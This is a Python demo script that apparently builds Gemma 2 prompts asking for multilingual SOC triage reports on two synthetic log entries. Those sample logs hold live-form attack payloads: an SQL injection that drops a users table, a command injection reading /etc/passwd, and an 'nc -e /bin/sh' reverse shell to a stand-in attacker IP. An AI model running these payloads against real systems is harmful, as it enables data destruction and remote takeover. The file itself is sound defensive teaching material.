"""
=============================================================================
Google DeepMind Gemma: Multilingual Cyber Threat Triage & Incident Analysis
=============================================================================

Author: Nandhakumar Murugan (Google Student Ambassador • KG KITE)
Description:
    Demonstrates how to use Gemma 2 for analyzing complex cybersecurity 
    telemetry, server access logs, and CVE alerts, generating actionable 
    incident response playbooks in English, Tamil (தமிழ்), and Hindi (हिन्दी).
"""

from typing import Dict, List, Any
import json

# Synthetic Security Telemetry Data
SAMPLE_SECURITY_LOGS = [
    {
        "event_id": "SEC-LOG-9821",
        "timestamp": "2026-08-25T01:45:12Z",
        "source_ip": "198.51.100.42",
        "target_endpoint": "/api/v1/auth/login",
        "http_method": "POST",
        "payload": "admin' OR 1=1; DROP TABLE users; --",
        "attack_classification": "CWE-89: SQL Injection",
        "severity": "CRITICAL"
    },
    {
        "event_id": "SEC-LOG-9822",
        "timestamp": "2026-08-25T01:46:05Z",
        "source_ip": "203.0.113.19",
        "target_endpoint": "/cloud/exec?cmd=cat%20/etc/passwd",
        "http_method": "GET",
        "payload": "; nc -e /bin/sh 198.51.100.42 4444",
        "attack_classification": "CWE-78: Command Injection",
        "severity": "CRITICAL"
    }
]

def format_gemma_threat_prompt(log_entry: Dict[str, Any]) -> str:
    """Formats an alert log into a structured Gemma 2 prompt for multilingual triage."""
    return f"""<start_of_turn>user
You are a senior SOC Security Analyst and AI Engineer.
Analyze the following security incident log:

Target Endpoint: {log_entry['target_endpoint']}
Attack Vector:   {log_entry['attack_classification']}
Raw Payload:     {log_entry['payload']}
Severity:        {log_entry['severity']}

Provide an incident triage report containing:
1. Executive Summary in English
2. Tamil Technical Explanation (தமிழ் விளக்கம்)
3. Hindi Technical Explanation (हिन्दी सारांश)
4. Recommended Immediate Firewall & Patching Actions<end_of_turn>
<start_of_turn>model
"""

def main():
    print("=" * 70)
    print("Google DeepMind Gemma: Multilingual Cyber Threat Triage")
    print("Author: Nandhakumar Murugan • Google Student Ambassador (KG KITE)")
    print("=" * 70)
    
    for log in SAMPLE_SECURITY_LOGS:
        prompt = format_gemma_threat_prompt(log)
        print(f"\n[+] Prepared Gemma 2 Prompt for {log['event_id']} ({log['attack_classification']}):")
        print("-" * 50)
        print(prompt[:350] + "...\n")

if __name__ == "__main__":
    main()
